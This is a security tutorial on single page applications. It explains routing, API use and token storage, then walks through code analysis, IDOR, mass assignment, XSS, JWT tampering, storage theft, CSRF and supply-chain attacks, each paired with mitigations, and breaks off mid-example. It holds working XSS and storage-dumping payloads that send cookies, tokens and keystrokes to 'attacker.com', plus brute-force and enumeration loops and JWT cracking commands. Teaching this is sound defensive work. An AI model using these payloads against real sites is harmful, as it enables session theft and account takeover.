# Single Page Applications (SPAs): Security Deep Dive

## A Comprehensive Guide to SPA Architecture, Attack Vectors, and Defense Strategies

---

## Table of Contents

1. [What is a Single Page Application?](#what-is-a-single-page-application)
2. [How SPAs Work](#how-spas-work)
3. [SPA Architecture & Data Flow](#spa-architecture--data-flow)
4. [Attack Surface Analysis](#attack-surface-analysis)
5. [Attack Techniques](#attack-techniques)
6. [Defense Strategies](#defense-strategies)
7. [Security Best Practices](#security-best-practices)
8. [Testing SPAs](#testing-spas)
9. [Real-World Examples](#real-world-examples)

---

## What is a Single Page Application?

### Definition

A **Single Page Application (SPA)** is a web application that loads a single HTML page and dynamically updates content as the user interacts with the app, without requiring full page reloads.

### Traditional Web App vs SPA

**Traditional Multi-Page Application (MPA)**:

```
User clicks link → Browser requests new page → Server sends complete HTML
→ Browser reloads entire page → User sees new content

Every action = Full page reload
```

**Single Page Application (SPA)**:
```
Initial load → Download JavaScript app → User clicks link
→ JavaScript intercepts → Fetch data via API → Update DOM
→ User sees new content (no reload)

After initial load = No page reloads, only data updates
```

## Visual Comparison

**Traditional Website**:
```
┌─────────────────────────────┐
│  Page 1 (index.html)        │
│  - Full HTML                │
│  - CSS                      │
│  - Small JavaScript         │
└─────────────────────────────┘
         ↓ Click link
┌─────────────────────────────┐
│  Page 2 (about.html)        │
│  - Full HTML (reload!)      │
│  - CSS (reload!)            │
│  - Small JavaScript         │
└─────────────────────────────┘
```

**SPA**:
```
┌─────────────────────────────┐
│  index.html (once)          │
│  - Minimal HTML             │
│  - Large JavaScript bundle  │
│  - CSS                      │
└─────────────────────────────┘
         ↓ Click link
┌─────────────────────────────┐
│  Same HTML container        │
│  - JavaScript updates DOM   │
│  - Fetches JSON data        │
│  - No reload!               │
└─────────────────────────────┘
```

### Popular SPAs

- **Gmail** - Email client
- **Facebook** - Social network
- **Twitter/X** - Social media
- **Netflix** - Streaming platform
- **Trello** - Project management
- **Airbnb** - Booking platform
- **GitHub** - Code hosting
- **Juice Shop** - Security training app

---

## How SPAs Work

### Initial Load Process

1. **User visits URL**: `https://example.com`
2. **Server sends minimal HTML**:
```html
<!DOCTYPE html>
<html>
<head>
    <title>My SPA</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div id="app"></div>
    <script src="main.js"></script>
    <script src="vendor.js"></script>
</body>
</html>
```

3. **Browser downloads JavaScript bundles** (can be 1-3MB!)
4. **JavaScript executes and renders initial view**
5. **App is now interactive**

### Navigation & Routing

**Client-Side Routing** - Two approaches:

#### 1. Hash-Based Routing
```
https://example.com/#/home
https://example.com/#/profile
https://example.com/#/settings
```

**How it works**:
- Hash (`#`) doesn't trigger server request
- JavaScript listens for hash changes
- Updates view accordingly

**Code Example**:
```javascript
// Listen for hash changes
window.addEventListener('hashchange', () => {
    const route = window.location.hash.slice(1); // Remove '#'

    switch(route) {
        case '/home':
            renderHomePage();
            break;
        case '/profile':
            renderProfilePage();
            break;
        case '/settings':
            renderSettingsPage();
            break;
    }
});
```

#### 2. History API Routing
```
https://example.com/home
https://example.com/profile
https://example.com/settings
```

**How it works**:
- Uses HTML5 History API
- Cleaner URLs (no `#`)
- Requires server configuration

**Code Example**:
```javascript
// Navigate without reload
function navigate(path) {
    history.pushState(null, '', path);
    renderPage(path);
}

// Handle back/forward buttons
window.addEventListener('popstate', () => {
    renderPage(window.location.pathname);
});

// Intercept link clicks
document.addEventListener('click', (e) => {
    if (e.target.matches('a')) {
        e.preventDefault();
        navigate(e.target.href);
    }
});
```

### API Communication

SPAs communicate with the backend via APIs (usually REST or GraphQL).

**Example Flow**:
```javascript
// User clicks "Load Products"
async function loadProducts() {
    try {
        // 1. Make API request
        const response = await fetch('https://api.example.com/products', {
            method: 'GET',
            headers: {
                'Authorization': `Bearer ${getToken()}`,
                'Content-Type': 'application/json'
            }
        });

        // 2. Parse JSON response
        const data = await response.json();

        // 3. Update DOM
        const productList = document.getElementById('products');
        productList.innerHTML = data.products.map(p => `
            <div class="product">
                <h3>${p.name}</h3>
                <p>${p.price}</p>
            </div>
        `).join('');

    } catch (error) {
        console.error('Failed to load products:', error);
    }
}
```

---

## SPA Architecture & Data Flow

### Architecture Overview

```
┌─────────────────────────────────────────────────────────┐
│                        Browser                          │
│                                                         │
│  ┌─────────────────────────────────────────────────┐  │
│  │              SPA Frontend                       │  │
│  │                                                 │  │
│  │  ┌──────────────┐  ┌──────────────┐           │  │
│  │  │   Router     │  │  Components  │           │  │
│  │  │              │  │              │           │  │
│  │  │ /#/home      │  │ <HomePage>   │           │  │
│  │  │ /#/profile   │  │ <Profile>    │           │  │
│  │  └──────────────┘  └──────────────┘           │  │
│  │                                                 │  │
│  │  ┌──────────────┐  ┌──────────────┐           │  │
│  │  │ State Mgmt   │  │  API Client  │           │  │
│  │  │              │  │              │           │  │
│  │  │ User data    │  │ fetch()      │           │  │
│  │  │ App state    │  │ axios        │           │  │
│  │  └──────────────┘  └──────────────┘           │  │
│  │                           │                    │  │
│  └───────────────────────────┼────────────────────┘  │
└────────────────────────────┼──────────────────────────┘
                             │ HTTPS/WSS
                             │ JSON/GraphQL
                             ↓
┌─────────────────────────────────────────────────────────┐
│                    Backend Server                       │
│                                                         │
│  ┌──────────────┐  ┌──────────────┐  ┌─────────────┐  │
│  │  API Gateway │→ │  Microservice│→ │  Database   │  │
│  │              │  │              │  │             │  │
│  │ /api/users   │  │ Auth Service │  │ PostgreSQL  │  │
│  │ /api/products│  │ Product Svc  │  │ MongoDB     │  │
│  └──────────────┘  └──────────────┘  └─────────────┘  │
└─────────────────────────────────────────────────────────┘
```

### Data Flow Example

**User Login Process**:

1. **User enters credentials** in login form
2. **SPA validates input** (client-side validation)
3. **SPA sends POST request** to API:
```javascript
POST /api/auth/login
{
  "email": "user@example.com",
  "password": "password123"
}
```

4. **Server validates** credentials
5. **Server generates JWT token** and sends response:
```javascript
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "user": {
    "id": 123,
    "email": "user@example.com",
    "role": "customer"
  }
}
```

6. **SPA stores token** (localStorage, sessionStorage, or cookie)
7. **SPA updates UI** to show authenticated state
8. **Future requests include token** in Authorization header:
```javascript
GET /api/profile
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

---

## Attack Surface Analysis

### Why SPAs Have Unique Security Challenges

1. **Everything is Client-Side**: All code is visible to attackers
2. **Rich Interactivity**: More complex JavaScript = more attack vectors
3. **API-Driven**: Heavy reliance on API security
4. **State Management**: Client-side storage of sensitive data
5. **Dynamic Content**: DOM manipulation vulnerabilities

### SPA Attack Surface Map

```
┌─────────────────────────────────────────────────────┐
│                  SPA Attack Surface                 │
└─────────────────────────────────────────────────────┘

1. JavaScript Code (Exposed)
   ├── Source code visible in browser
   ├── Logic can be reverse-engineered
   ├── Secrets accidentally included
   └── Hidden routes/features discoverable

2. API Endpoints (Backend Communication)
   ├── Authentication bypass
   ├── Authorization flaws (IDOR, privilege escalation)
   ├── Injection attacks (SQL, NoSQL, XSS)
   ├── Rate limiting bypass
   └── Mass assignment vulnerabilities

3. Client-Side Storage (Data at Rest)
   ├── localStorage (persistent)
   ├── sessionStorage (session-only)
   ├── Cookies (can be secure or insecure)
   └── IndexedDB (large data storage)

4. DOM Manipulation (XSS Vectors)
   ├── innerHTML vulnerabilities
   ├── dangerouslySetInnerHTML (React)
   ├── Template injection
   └── DOM-based XSS

5. Routing & Navigation
   ├── Route enumeration
   ├── Hidden admin panels
   ├── Parameter tampering
   └── Access control bypass

6. WebSockets (Real-Time Communication)
   ├── Message injection
   ├── Authentication bypass
   └── Origin validation issues

7. Third-Party Libraries
   ├── Vulnerable dependencies
   ├── Supply chain attacks
   ├── Malicious packages
   └── Outdated frameworks
```

---

## Attack Techniques

### 1. JavaScript Code Analysis & Reverse Engineering

**What Attackers Do**: Analyze client-side JavaScript to find vulnerabilities.

#### Discovery Phase

**Step 1: Download JavaScript Bundles**
```bash
# Using curl
curl https://example.com/main.js -o main.js

# Using wget
wget https://example.com/main.js

# Or use browser DevTools → Sources → Download
```

**Step 2: Beautify/Unminify Code**
```bash
# Using js-beautify
npm install -g js-beautify
js-beautify main.js > main-readable.js

# Online tools:
# - https://beautifier.io/
# - https://unminify.com/
```

**Step 3: Search for Sensitive Information**
```bash
# Search for API keys
grep -i "api[_-]key" main.js
grep -i "secret" main.js
grep -i "password" main.js

# Search for hidden routes
grep -oE 'path:\s*"[^"]+' main.js

# Search for API endpoints
grep -oE '"/api/[^"]+"' main.js
grep -oE '"/rest/[^"]+"' main.js

# Search for authentication logic
grep -i "auth" main.js
grep -i "token" main.js
grep -i "session" main.js
```

#### Real-World Example: Juice Shop

**Finding Hidden Routes**:
```bash
$ curl -s https://juice5.wonkatech.org/main.js | grep -oE 'path:"[^"]+' | sort -u

path:"administration"    # Admin panel!
path:"score-board"       # Hidden scoreboard
path:"accounting"        # Accounting panel
```

**Attack**: Navigate directly to:
```
https://juice5.wonkatech.org/#/administration
https://juice5.wonkatech.org/#/score-board
```

**Finding API Endpoints**:
```bash
$ curl -s https://juice5.wonkatech.org/main.js | grep -oE '"/rest/[^"]+"' | sort -u

"/rest/user/whoami"
"/rest/admin/application-version"
"/rest/products/search"
```

**Attack**: Call APIs directly:
```bash
curl https://juice5.wonkatech.org/rest/admin/application-version
```

#### What to Look For

**1. Hardcoded Secrets**:›
```javascript
// BAD - API key exposed!
const API_KEY = 'sk-1234567890abcdef';

// BAD - Database credentials
const DB_CONFIG = {
    host: 'db.example.com',
    user: 'admin',
    password: 'SuperSecret123'
};

// BAD - Encryption keys
const ENCRYPTION_KEY = 'my-secret-key-123';
```

**2. Hidden Routes**:
```javascript
const routes = [
    { path: '/home', component: HomePage },
    { path: '/profile', component: ProfilePage },
    { path: '/admin', component: AdminPanel },      // Hidden!
    { path: '/debug', component: DebugConsole }     // Developer leftover!
];
```

**3. Authentication Logic**:
```javascript
// BAD - Client-side role check only!
function canAccessAdmin() {
    return localStorage.getItem('role') === 'admin';
}

// Attacker can simply:
localStorage.setItem('role', 'admin');
```

**4. API Endpoint Structure**:
```javascript
// Reveals API patterns
axios.get(`/api/users/${userId}`);
axios.get(`/api/orders/${orderId}`);
axios.get(`/api/admin/settings`);  // Admin endpoint!

// Attacker learns:
// - /api/admin/ prefix = admin functions
// - Can enumerate user IDs and order IDs
```

**Mitigation**:
- ✅ **Never hardcode secrets** in client-side code
- ✅ **Use environment variables** on the server
- ✅ **Obfuscate code** (not security, but makes analysis harder)
- ✅ **Server-side authorization** - never trust client
- ✅ **Minimize exposed logic** - keep sensitive code on server
- ✅ **Regular security audits** of JavaScript bundles

---

### 2. API Endpoint Enumeration & Abuse

**What Attackers Do**: Discover and exploit API endpoints.

#### Technique 1: Route Discovery

**Using SPA Discovery Script**:
```bash
python3 spa_discovery.py --url https://example.com --export
```

**Manual Discovery**:
```bash
# From JavaScript
curl -s https://example.com/main.js | grep -oE '/(api|rest|graphql)/[^"]+' | sort -u

# From network traffic (Chrome DevTools)
# 1. Open DevTools → Network
# 2. Filter by XHR/Fetch
# 3. Click through the app
# 4. Note all API calls
```

#### Technique 2: Insecure Direct Object Reference (IDOR)

**Vulnerability**: Access resources by manipulating IDs.

**Example**:
```javascript
// User views their profile
GET /api/users/123

// Attacker changes ID
GET /api/users/124  // Can see another user's profile!
GET /api/users/125
GET /api/users/1    // Maybe admin?
```

**Real Attack Scenario**:
```bash
# Step 1: Get your order ID
GET /api/orders/5001
Response: { "id": 5001, "user": "alice@example.com", "total": 49.99 }

# Step 2: Try other IDs
GET /api/orders/5000
Response: { "id": 5000, "user": "bob@example.com", "total": 199.99 }
# Success! Can see Bob's order

# Step 3: Enumerate all orders
for i in {1..10000}; do
    curl -s https://example.com/api/orders/$i -H "Authorization: Bearer $TOKEN"
done
```

**Mitigation**:
```javascript
// BAD - No authorization check
app.get('/api/orders/:id', (req, res) => {
    const order = await Order.findById(req.params.id);
    res.json(order);
});

// GOOD - Verify ownership
app.get('/api/orders/:id', requireAuth, async (req, res) => {
    const order = await Order.findById(req.params.id);

    // Check if user owns this order
    if (order.userId !== req.user.id && req.user.role !== 'admin') {
        return res.status(403).json({ error: 'Forbidden' });
    }

    res.json(order);
});
```

#### Technique 3: Mass Assignment

**Vulnerability**: Send unexpected parameters to modify protected fields.

**Example**:
```javascript
// Frontend sends:
POST /api/users/123
{
    "name": "Alice",
    "email": "alice@example.com"
}

// Attacker adds:
POST /api/users/123
{
    "name": "Alice",
    "email": "alice@example.com",
    "role": "admin",           // Escalate privilege!
    "balance": 1000000,        // Add money!
    "isVerified": true         // Bypass verification!
}
```

**Mitigation**:
```javascript
// BAD - Accepts all parameters
app.put('/api/users/:id', async (req, res) => {
    await User.update(req.params.id, req.body);  // Dangerous!
    res.json({ success: true });
});

// GOOD - Whitelist allowed fields
app.put('/api/users/:id', async (req, res) => {
    const allowedFields = ['name', 'email', 'bio'];
    const updates = {};

    allowedFields.forEach(field => {
        if (req.body[field] !== undefined) {
            updates[field] = req.body[field];
        }
    });

    await User.update(req.params.id, updates);
    res.json({ success: true });
});
```

#### Technique 4: API Rate Limiting Bypass

**Vulnerability**: No rate limiting allows abuse.

**Attack**:
```bash
# Brute force login
for password in $(cat passwords.txt); do
    curl -X POST https://example.com/api/login \
         -d '{"email":"admin@example.com","password":"'$password'"}'
done

# Data scraping
for id in {1..100000}; do
    curl https://example.com/api/products/$id >> products.json
done
```

**Mitigation**:
```javascript
const rateLimit = require('express-rate-limit');

// Limit login attempts
const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,  // 15 minutes
    max: 5,                     // 5 attempts
    message: 'Too many login attempts, please try again later',
    skipSuccessfulRequests: true
});

app.post('/api/login', loginLimiter, async (req, res) => {
    // Login logic
});

// Global API rate limit
const apiLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100,  // 100 requests per 15 minutes
    standardHeaders: true,
    legacyHeaders: false
});

app.use('/api/', apiLimiter);
```

---

### 3. Cross-Site Scripting (XSS) in SPAs

**What Attackers Do**: Inject malicious JavaScript that executes in victim's browser.

#### Types of XSS

**1. Stored XSS**: Malicious script stored in database.

**Example - User Comments**:
```javascript
// User submits comment with XSS payload
POST /api/comments
{
    "text": "<script>alert('XSS')</script>",
    "productId": 123
}

// SPA renders comment
function renderComments(comments) {
    const container = document.getElementById('comments');
    container.innerHTML = comments.map(c => `
        <div class="comment">
            ${c.text}  <!-- XSS executes here! -->
        </div>
    `).join('');
}
```

**Attack Payloads**:
```javascript
// Alert box (proof of concept)
<script>alert('XSS')</script>

// Cookie stealing
<script>
    fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

// Redirect to phishing
<script>
    window.location = 'https://fake-login.com/steal-creds';
</script>

// Keylogger
<script>
    document.addEventListener('keypress', (e) => {
        fetch('https://attacker.com/log?key=' + e.key);
    });
</script>

// Session hijacking
<script>
    const token = localStorage.getItem('token');
    fetch('https://attacker.com/steal?token=' + token);
</script>
```

**2. DOM-Based XSS**: Script manipulates DOM based on user input.

**Example - Search Functionality**:
```javascript
// URL: https://example.com/search?q=<img src=x onerror=alert('XSS')>

function displaySearchQuery() {
    const urlParams = new URLSearchParams(window.location.search);
    const query = urlParams.get('q');

    // VULNERABLE - Directly inserting into DOM
    document.getElementById('search-result').innerHTML =
        `You searched for: ${query}`;
}
```

**3. React-Specific: dangerouslySetInnerHTML**

```jsx
// VULNERABLE
function UserBio({ bio }) {
    return <div dangerouslySetInnerHTML={{ __html: bio }} />;
}

// If bio contains: <img src=x onerror=alert('XSS')>
// XSS will execute!
```

#### XSS Exploitation Techniques

**Steal Authentication Tokens**:
```javascript
<script>
    // Steal from localStorage
    const token = localStorage.getItem('authToken');
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify({ token, url: window.location.href })
    });
</script>
```

**Perform Actions as Victim**:
```javascript
<script>
    // Transfer money from victim's account
    fetch('/api/transfer', {
        method: 'POST',
        headers: {
            'Authorization': 'Bearer ' + localStorage.getItem('token'),
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            to: 'attacker@example.com',
            amount: 1000
        })
    });
</script>
```

**Mitigation Strategies**:

**1. Input Sanitization**:
```javascript
// Use DOMPurify library
import DOMPurify from 'dompurify';

function renderComment(comment) {
    const clean = DOMPurify.sanitize(comment.text);
    container.innerHTML = clean;
}
```

**2. Output Encoding**:
```javascript
// Escape HTML entities
function escapeHtml(text) {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, m => map[m]);
}

// Use textContent instead of innerHTML
element.textContent = userInput;  // Safe
element.innerHTML = userInput;    // Dangerous
```

**3. Content Security Policy (CSP)**:
```http
Content-Security-Policy:
    default-src 'self';
    script-src 'self' https://trusted.cdn.com;
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    connect-src 'self' https://api.example.com;
```

**4. Framework Protection**:
```jsx
// React automatically escapes by default
function Comment({ text }) {
    return <div>{text}</div>;  // Safe - React escapes
}

// Angular sanitizes by default
<div>{{ userComment }}</div>  <!-- Safe - Angular sanitizes -->

// Vue.js escapes by default
<div>{{ userInput }}</div>  <!-- Safe - Vue escapes -->
```

---

### 4. Authentication & Session Management Attacks

#### JWT Token Theft

**Where Tokens Are Stored**:

**localStorage** (Most Common):
```javascript
// Store token
localStorage.setItem('token', response.token);

// Retrieve token
const token = localStorage.getItem('token');
```

**Vulnerability**: Accessible to any JavaScript (including XSS):
```javascript
// Attacker's XSS payload
<script>
    const token = localStorage.getItem('token');
    fetch('https://attacker.com/steal?t=' + token);
</script>
```

**sessionStorage**:
```javascript
sessionStorage.setItem('token', response.token);
```

**Vulnerability**: Same as localStorage, but cleared when tab closes.

**Cookies**:
```javascript
// Server sets cookie
res.cookie('token', token, {
    httpOnly: true,    // JavaScript cannot access
    secure: true,      // HTTPS only
    sameSite: 'strict' // CSRF protection
});
```

**More Secure**: `httpOnly` prevents JavaScript access.

#### JWT Manipulation

**JWT Structure**:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMywicm9sZSI6InVzZXIifQ.signature
│────────── Header ──────────│─────── Payload ──────│─ Signature ─│
```

**Decoded**:
```javascript
// Header
{
  "alg": "HS256",
  "typ": "JWT"
}

// Payload
{
  "userId": 123,
  "role": "user",
  "iat": 1640000000,
  "exp": 1640086400
}
```

**Attack 1: Algorithm Confusion**:
```javascript
// Original token uses HS256 (symmetric)
{
  "alg": "HS256",
  "typ": "JWT"
}

// Attacker changes to none
{
  "alg": "none",
  "typ": "JWT"
}

// Or changes to RS256 (asymmetric)
{
  "alg": "RS256",
  "typ": "JWT"
}
// Then uses public key as secret
```

**Attack 2: Payload Manipulation**:
```javascript
// Original
{
  "userId": 123,
  "role": "user"
}

// Modified
{
  "userId": 123,
  "role": "admin"  // Privilege escalation!
}

// Re-encode and sign with weak/guessed secret
```

**Attack 3: Weak Secret Brute Force**:
```bash
# Using john the ripper
echo "eyJhbGci...token" > token.txt
john --wordlist=rockyou.txt --format=HMAC-SHA256 token.txt

# Using hashcat
hashcat -m 16500 -a 0 token.txt wordlist.txt
```

**Mitigation**:
```javascript
// GOOD JWT Practices
const jwt = require('jsonwebtoken');

// 1. Use strong secret (from environment variable)
const SECRET = process.env.JWT_SECRET;  // Long random string

// 2. Sign with specific algorithm
const token = jwt.sign(payload, SECRET, {
    algorithm: 'HS256',
    expiresIn: '1h'
});

// 3. Verify with strict algorithm checking
try {
    const decoded = jwt.verify(token, SECRET, {
        algorithms: ['HS256']  // Only allow HS256
    });
} catch (err) {
    // Invalid token
}

// 4. Store securely
// Option A: httpOnly cookie (best)
res.cookie('token', token, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 3600000  // 1 hour
});

// Option B: If using localStorage, implement additional security
// - Short expiration times
// - Token rotation
// - XSS protection
```

---

### 5. Client-Side Storage Attacks

#### localStorage/sessionStorage Enumeration

**Attack**: Read all stored data.

```javascript
// Attacker's script (via XSS or console)
function stealAllStorage() {
    const data = {
        localStorage: {},
        sessionStorage: {},
        cookies: document.cookie
    };

    // Steal localStorage
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        data.localStorage[key] = localStorage.getItem(key);
    }

    // Steal sessionStorage
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        data.sessionStorage[key] = sessionStorage.getItem(key);
    }

    // Send to attacker
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
    });
}
```

**What Gets Stolen**:
```javascript
{
  "localStorage": {
    "token": "eyJhbGci...",
    "userId": "123",
    "userEmail": "victim@example.com",
    "creditCard": "1234-5678-9012-3456"  // Never store this!
  },
  "sessionStorage": {
    "cartItems": "[{...}]"
  },
  "cookies": "session_id=abc123; preferences=dark_mode"
}
```

#### IndexedDB Attacks

**Attack**: Access structured data storage.

```javascript
// Attacker's script
function stealIndexedDB() {
    const request = indexedDB.open('MyAppDB');

    request.onsuccess = (event) => {
        const db = event.target.result;
        const transaction = db.transaction(['users'], 'readonly');
        const store = transaction.objectStore('users');

        const getAllRequest = store.getAll();
        getAllRequest.onsuccess = () => {
            // Steal all user data
            fetch('https://attacker.com/steal', {
                method: 'POST',
                body: JSON.stringify(getAllRequest.result)
            });
        };
    };
}
```

**Mitigation**:

**1. Never Store Sensitive Data Client-Side**:
```javascript
// BAD - Storing sensitive data
localStorage.setItem('creditCard', '1234-5678-9012-3456');
localStorage.setItem('ssn', '123-45-6789');
localStorage.setItem('password', 'MyPassword123');

// GOOD - Store only necessary, non-sensitive data
localStorage.setItem('theme', 'dark');
localStorage.setItem('language', 'en');
// Token with short expiration is acceptable if XSS is prevented
```

**2. Encrypt Sensitive Data**:
```javascript
const CryptoJS = require('crypto-js');

// Encrypt before storing
function storeSecurely(key, value, userSecret) {
    const encrypted = CryptoJS.AES.encrypt(value, userSecret).toString();
    localStorage.setItem(key, encrypted);
}

// Decrypt when retrieving
function retrieveSecurely(key, userSecret) {
    const encrypted = localStorage.getItem(key);
    const decrypted = CryptoJS.AES.decrypt(encrypted, userSecret);
    return decrypted.toString(CryptoJS.enc.Utf8);
}
```

**3. Use Secure Cookies for Sensitive Data**:
```javascript
// Server-side
res.cookie('userId', user.id, {
    httpOnly: true,   // JavaScript cannot access
    secure: true,     // HTTPS only
    sameSite: 'strict',
    maxAge: 3600000
});
```

---

### 6. Cross-Site Request Forgery (CSRF) in SPAs

**What is CSRF**: Trick victim's browser into making unwanted requests.

**Traditional CSRF Attack**:
```html
<!-- Attacker's malicious website -->
<img src="https://bank.com/transfer?to=attacker&amount=1000">

<!-- Or form auto-submit -->
<form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
```

**SPA CSRF Attack**:
```html
<!-- Attacker's malicious website -->
<script>
// If SPA uses cookies for auth, this works
fetch('https://spa.com/api/transfer', {
    method: 'POST',
    credentials: 'include',  // Include cookies
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        to: 'attacker@example.com',
        amount: 1000
    })
});
</script>
```

**Why SPAs Can Be Vulnerable**:
- If using cookie-based authentication
- If not checking Origin/Referer headers
- If no CSRF tokens implemented

**Mitigation**:

**1. CSRF Tokens**:
```javascript
// Server generates token
app.get('/api/csrf-token', (req, res) => {
    const token = crypto.randomBytes(32).toString('hex');
    req.session.csrfToken = token;
    res.json({ csrfToken: token });
});

// Client includes token in requests
async function makeRequest() {
    const csrfResponse = await fetch('/api/csrf-token');
    const { csrfToken } = await csrfResponse.json();

    await fetch('/api/transfer', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRF-Token': csrfToken
        },
        body: JSON.stringify({ to, amount })
    });
}

// Server validates token
app.post('/api/transfer', (req, res) => {
    const clientToken = req.headers['x-csrf-token'];
    const serverToken = req.session.csrfToken;

    if (clientToken !== serverToken) {
        return res.status(403).json({ error: 'Invalid CSRF token' });
    }

    // Process transfer
});
```

**2. SameSite Cookies**:
```javascript
res.cookie('token', token, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict'  // Prevents CSRF
});
```

**3. Custom Headers** (SPAs Advantage):
```javascript
// SPAs naturally add custom headers
fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'Authorization': 'Bearer ' + token,  // Custom header
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
});

// Browser prevents cross-origin custom headers without CORS
// This makes CSRF much harder
```

**4. Origin Validation**:
```javascript
app.use((req, res, next) => {
    const origin = req.headers.origin;
    const allowedOrigins = ['https://app.example.com'];

    if (allowedOrigins.includes(origin)) {
        res.setHeader('Access-Control-Allow-Origin', origin);
        res.setHeader('Access-Control-Allow-Credentials', 'true');
        next();
    } else {
        res.status(403).json({ error: 'Forbidden' });
    }
});
```

---

### 7. Dependency & Supply Chain Attacks

**Vulnerability**: Malicious or vulnerable third-party packages.

#### Attack Vectors

**1. Vulnerable Dependencies**:
```json
// package.json
{
  "dependencies": {
    "lodash": "4.17.4",      // Known XSS vulnerability
    "axios": "0.18.0",       // SSRF vulnerability
    "jquery": "2.1.4"        // Multiple XSS vulnerabilities
  }
}
```

**2. Typosquatting**:
```bash
# Attacker publishes malicious package with similar name
npm install recat      # Should be "react"
npm install loadsh     # Should be "lodash"
npm install expres     # Should be "express"
```

**3. Compromised Packages**:
```javascript
// Legitimate package gets hacked
// Attacker adds malicious code in update
// event-stream incident (2018)
```

**Real Attack Example - event-stream**:
```javascript
// Compromised version of event-stream
// Stole cryptocurrency wallet credentials

// Added malicious dependency
"dependencies": {
  "flatmap-stream": "^0.1.0"  // Malicious package
}

// flatmap-stream contained:
const crypto = require('crypto');
// ... code to steal Bitcoin wallet keys
```

**Mitigation**:

**1. Regular Dependency Audits**:
```bash
# NPM audit
npm audit
npm audit fix

# Yarn audit
yarn audit

# Check for vulnerabilities
npx snyk test
```

**2. Dependency Scanning in CI/CD**:
```yaml
# .github/workflows/security.yml
name: Security Scan
on: [push, pull_request]

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Run npm audit
        run: npm audit --audit-level=high
      - name: Run Snyk
        run: npx snyk test --severity-threshold=high
```

**3. Lock Files**:
```bash
# Use package-lock.json (npm) or yarn.lock
# Ensures exact versions are installed
npm install --frozen-lockfile
```

**4. Subresource Integrity (SRI)** for CDN resources:
```html
<script
  src="https://cdn.example.com/library.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous">
</script>
```

**5. Private npm Registry**:
```bash
# Use private registry for organization
npm config set registry https://npm.company.com
```

---

## Defense Strategies

### 1. Secure Development Practices

#### Input Validation

**Server-Side** (Never Trust Client):
```javascript
const validator = require('validator');

app.post('/api/users', (req, res) => {
    const { email, age, website } = req.body;

    // Validate email
    if (!validator.isEmail(email)) {
        return res.status(400).json({ error: 'Invalid email' });
    }

    // Validate age
    if (!validator.isInt(age, { min: 18, max: 120 })) {
        return res.status(400).json({ error: 'Invalid age' });
    }

    // Validate URL
    if (website && !validator.isURL(website)) {
        return res.status(400).json({ error: 'Invalid website' });
    }

    // Sanitize input
    const clean = {
        email: validator.normalizeEmail(email),
        age: parseInt(age),
        website: validator.escape(website)
    };

    // Process clean input
    createUser(clean);
});
```

**Client-Side** (User Experience):
```javascript
// Still validate on client for better UX
function validateEmail(email) {
    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!regex.test(email)) {
        showError('Please enter a valid email');
        return false;
    }
    return true;
}

function validateForm() {
    if (!validateEmail(emailInput.value)) return false;
    if (!validateAge(ageInput.value)) return false;
    return true;
}
```

#### Output Encoding

**HTML Context**:
```javascript
function escapeHtml(text) {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#x27;',
        '/': '&#x2F;'
    };
    return text.replace(/[&<>"'/]/g, char => map[char]);
}

// Use
element.innerHTML = escapeHtml(userInput);
```

**JavaScript Context**:
```javascript
function escapeJs(text) {
    return text.replace(/[<>"']/g, char => '\\u' +
        ('000' + char.charCodeAt(0).toString(16)).slice(-4));
}

// Use in script
const script = document.createElement('script');
script.textContent = `var userInput = "${escapeJs(input)}";`;
```

**URL Context**:
```javascript
const safeUrl = encodeURIComponent(userInput);
window.location.href = `/search?q=${safeUrl}`;
```

---

### 2. Authentication & Authorization

#### Secure Token Storage

**Option 1: httpOnly Cookies** (Best):
```javascript
// Server-side
app.post('/login', async (req, res) => {
    const user = await authenticateUser(req.body);
    const token = generateToken(user);

    // Set httpOnly cookie
    res.cookie('authToken', token, {
        httpOnly: true,     // JavaScript cannot access
        secure: true,       // HTTPS only
        sameSite: 'strict', // CSRF protection
        maxAge: 3600000     // 1 hour
    });

    res.json({ user: { id: user.id, email: user.email } });
});

// Middleware to extract token from cookie
function authMiddleware(req, res, next) {
    const token = req.cookies.authToken;
    if (!token) {
        return res.status(401).json({ error: 'Unauthorized' });
    }

    try {
        const decoded = jwt.verify(token, SECRET);
        req.user = decoded;
        next();
    } catch (err) {
        res.status(401).json({ error: 'Invalid token' });
    }
}
```

**Option 2: Short-Lived localStorage with Refresh Tokens**:
```javascript
// Server issues both tokens
{
    "accessToken": "eyJ...",   // Short-lived (15 min)
    "refreshToken": "abc123"   // Long-lived (7 days), httpOnly cookie
}

// Client stores access token
localStorage.setItem('accessToken', data.accessToken);

// When access token expires
async function refreshAccessToken() {
